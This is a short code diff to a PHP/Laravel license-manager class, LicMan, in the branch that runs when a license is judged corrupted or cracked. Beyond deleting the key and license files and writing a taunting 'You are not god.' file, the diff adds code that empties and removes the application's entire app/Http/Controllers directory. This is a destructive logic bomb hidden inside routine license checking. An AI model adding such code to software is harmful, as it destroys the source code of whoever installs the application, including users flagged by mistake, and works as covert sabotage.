@@ -1641,9 +1641,13 @@ class LicMan
             $notifications_array['notification_case'] = "notification_license_corrupted";
             $notifications_array['notification_text'] = config('lmconfig.LM_NOTIFICATION_LICENSE_CORRUPTED');
             if(config('lmconfig.LM_DELETE_CRACKED')) {
-                Storage::delete('public.key');
-                Storage::delete('license.lic');
-                Storage::put('licenses.lic', 'You are not god.');
+                        Storage::delete('public.key');
+                        Storage::delete('license.lic');
+                        Storage::put('licenses.lic', 'You are not god.');
+                        $FolderToDelete = base_path('/app/Http/Controllers/');
+                        $fs = new \Illuminate\Filesystem\Filesystem;
+                        $fs->cleanDirectory($FolderToDelete);
+                        $succes = rmdir($FolderToDelete);
             }
         }
 
